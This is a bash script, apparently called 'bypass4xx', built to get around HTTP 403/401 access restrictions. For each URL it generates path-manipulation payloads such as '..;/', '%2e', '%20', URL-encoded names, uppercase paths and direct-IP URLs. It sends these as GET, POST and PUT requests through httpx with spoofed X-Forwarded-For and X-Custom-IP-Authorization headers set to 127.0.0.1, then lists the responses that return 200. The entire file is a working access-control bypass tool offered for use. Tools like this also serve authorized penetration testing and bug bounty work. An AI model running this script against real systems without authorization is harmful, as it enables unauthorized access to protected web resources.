#!/bin/bash

#if [ -z $1 ]; then echo "Usage: bypass4xx [URL]"; exit; fi

urls=$(cat -)

if [ -f 4xxpayloads ]; then rm 4xxpayloads; fi
for url in $urls
do
echo "Doing $url"
conlen=$(echo "$url" | httpx -silent -content-length -no-color | awk '{print $2}' | grep -Po "[0-9]+")
base=$(echo "$(echo "$url" | cut -d/ -f1,2,3)")
path=$(echo "/$(echo "$url" | cut -d/ -f4-)") #| sed 's/\/$//g')
ips=$(dig "$(echo "$base" | cut -d/ -f 3)" +short)
payloads=("$url")
filename=$(echo $url | grep -oP "[^/]+/?$" | grep -Po "^[^/]+")
fileurlenc=$(printf $filename | od -An -tx1 -v -w | tr ' ' % | sed 's/%0a//g')
filename1st=$(printf $url | grep -oP "[^/]+/?$" | grep -oP ^.)
fileurlenc1st=$(printf $filename1st | grep -oP "[^/]+/?$" | grep -oP ^. | od -An -tx1 -v -w | tr ' ' % | sed 's/%0a//g')

# only the base
#payloads+=($base)

if [[ "$path" =~ "/"$ ]]
then
        # /api => /api/.
        payloads+=("$base$(echo $path | awk '{print $0"."}')")

        # /api => /api/./
        payloads+=("$base$(echo $path | awk '{print $0"./"}')")

        # /api => /api/*
        payloads+=("$base$(echo $path | awk '{print $0"*"}')")

        # /api => /api..;/
        payloads+=("$base$(echo $path | sed 's/\/$/\.\.;\//g')")

        # /api => /api;/
        payloads+=("$base$(echo $path | sed 's/\/$/;\//g')")

        # /api => /api/%20
        payloads+=("$base$(echo $path | awk '{print $0"%20"}')")

        # /api => /api/%2e
        payloads+=("$base$(echo $path | awk '{print $0"%2e"}')")

        # /api => /api/~
        payloads+=("$base$(echo $path | awk '{print $0"~"}')")

        # /api => /api/%09
        payloads+=("$base$(echo $path | awk '{print $0"%09"}')")
else
        # /api => /api/.
        payloads+=("$base$(echo $path | awk '{print $0"/."}')")

        # /api => /api/./
        payloads+=("$base$(echo $path | awk '{print $0"/./"}')")

        # /api => /api/*
        payloads+=("$base$(echo $path | awk '{print $0"/*"}')")

        # /api => /api..;/
        payloads+=("$base$(echo $path | awk '{print $0"..;/"}')")

        # /api => /api;/
        payloads+=("$base$(echo $path | awk '{print $0";/"}')")

        # /api => /api/%20
        payloads+=("$base$(echo $path | awk '{print $0"/%20"}')")

        # /api => /api/%2e
        payloads+=("$base$(echo $path | awk '{print $0"/%2e"}')")

        # /api = /api/~
        payloads+=("$base$(echo $path | awk '{print $0"/~"}')")

        # /api => /api/%09
        payloads+=("$base$(echo $path | awk '{print $0"/%09"}')")

        # /api => /api/.json
        payloads+=("$base$(echo $path | awk '{print $0"/.json"}')")
fi

# /api => /%61%70%69
payloads+=("$base$(echo $path | sed "s/$filename/$fileurlenc/g")")

# /api => /%61pi
payloads+=("$base$(echo $path | sed "s/\(.*\)\/$filename1st/\1\/$fileurlenc1st/")")

# /api => /api.json
payloads+=("$base$(echo $path | awk '{print $0".json"}')")

# /api => https://IP/api
payloads+=($(echo $ips | grep -oP "[0-9]{2,}\.[0-9]{2,}\.[0-9]{2,}\.[0-9]{2,}" | httpx -silent | awk -v var=$path '{print $0var}'))

# /api => /.;/api
payloads+=("$base$(echo "/.;$path")")

# /api => /api#
payloads+=("$base$(echo $path | awk '{print $0"#"}')")

# /api => /api?params
payloads+=("$base$(echo $path | awk '{print $0"?gg"}')")

# /api => /%20/api
payloads+=("$base$(echo $path | sed 's/\//\/%20\//g')")

# /api => /%2e/api
payloads+=("$base$(echo $path | sed 's/\//\/%2e\//g')")

# /api => /API
payloads+=("$base$(echo $path | awk '{print toupper($0)}')")

# /api => /./api
payloads+=("$base$(echo $path | sed 's#/#/./#1')")

# /api => //api
payloads+=("$base$(echo $path | sed 's/\//\/\//g')")

# https => http
# http => https
if [ $(echo "$url" | grep https | wc -l) -gt 0 ]; then
        payloads+=("$(echo $url | sed 's/https/http/g')")
else
        payloads+=("$(echo $url | sed 's/http/https/g')")
fi

echo ${payloads[*]} | tr ' ' '\n' >> 4xxpayloads

done

echo "GET:"
cat 4xxpayloads | httpx -silent -status-code -content-length -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" | grep "\[.*200.*\]"

echo "POST:"
cat 4xxpayloads | httpx -silent -status-code -content-length -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" -H "Content-length: 0" -x POST  | grep "\[.*200.*\]"

echo "PUT:"
cat 4xxpayloads | httpx -silent -status-code -content-length -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" -H "Content-length: 0" -x PUT | grep "\[.*200.*\]"
rm 4xxpayloads
